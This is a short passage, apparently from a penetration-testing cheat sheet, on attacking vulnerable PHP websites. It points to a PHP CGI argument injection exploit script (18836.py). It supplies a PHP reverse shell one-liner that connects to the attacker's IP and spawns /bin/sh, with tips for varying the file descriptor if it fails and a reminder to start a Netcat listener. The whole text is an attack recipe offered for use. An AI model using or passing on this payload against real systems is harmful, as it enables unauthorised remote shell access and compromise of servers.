## Targeting PHP

If we have a vulnerable PHP based website that is running on a vulnerable PHP version, we can use an exploit script like: "CGI Argument Injection (18836.py)", with this reverse shell one liner using PHP: "'$sock=fsockopen("(our IP)",1234);exec("/bin/sh -i <&3 >&3 2>&3");'" 

**Note: If that didn't work, we can try to replace the number 3 in the code with 4,5, or 6.**

We have to have Netcat running on the same port that we specified in the payload.
